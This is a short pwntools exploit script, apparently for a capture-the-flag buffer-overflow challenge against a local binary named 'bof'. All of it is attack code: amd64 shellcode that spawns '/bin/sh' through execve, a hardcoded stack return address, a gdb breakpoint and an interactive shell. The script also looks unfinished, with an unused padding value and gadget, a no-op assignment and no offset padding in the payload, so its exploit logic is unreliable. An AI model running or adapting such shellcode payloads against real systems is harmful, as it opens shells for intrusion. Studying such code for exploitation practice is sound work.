from pwn import *

elf = ELF('./bof', checksec=False)
pr = process('./bof')

padding = 120

shellcode = asm (
    '''
    mov rax, 0x3b
    mov rdi, 0x68732f6e69622f
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    
    syscall
    
    
    
    '''
    ,arch='amd64'
)
call_rax = p64(0x0000000000401010)
a = p64(0x7ffd81243a10)
payload = shellcode
payload = payload
payload += a


pr.sendlineafter(b'> ', a)
gdb.attach(pr, gdbscript='''
           b *0x00000000004011e9
           c
           ''')

pr.sendlineafter(b'> ', payload)


pr.interactive()

#0x7ffcc28d6050